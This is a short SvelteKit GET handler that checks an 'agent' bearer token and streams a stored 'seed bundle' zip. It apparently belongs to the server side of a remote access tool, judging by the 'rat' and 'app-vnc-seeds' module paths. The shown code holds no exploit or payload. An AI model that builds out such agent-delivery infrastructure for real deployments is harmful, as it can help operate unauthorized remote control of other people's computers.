import { error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { getSeedBundle, resolveSeedFilePath } from '$lib/server/rat/app-vnc-seeds';
import { registry } from '$lib/server/rat/store';
import { createReadStream } from 'node:fs';
import { stat } from 'node:fs/promises';
import { getBearerToken } from '$lib/server/http/bearer.js';

export const GET: RequestHandler = async ({ params, url, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing seed identifier');
	}
	const agentId = url.searchParams.get('agent');
	if (!agentId) {
		throw error(400, 'Agent identifier required');
	}
	const token = getBearerToken(request.headers.get('authorization'));
	registry.authorizeAgent(agentId, token);
	const bundle = await getSeedBundle(id);
	if (!bundle) {
		throw error(404, 'Seed bundle not found');
	}
	const filePath = resolveSeedFilePath(bundle);
	const info = await stat(filePath);
	const stream = createReadStream(filePath);
	const safeName = bundle.originalName.replace(/"/g, '');
	return new Response(stream as unknown as ReadableStream<Uint8Array>, {
		headers: {
			'content-type': 'application/zip',
			'content-length': info.size.toString(),
			'content-disposition': `attachment; filename="${safeName}"`,
			'cache-control': 'no-store'
		}
	});
};
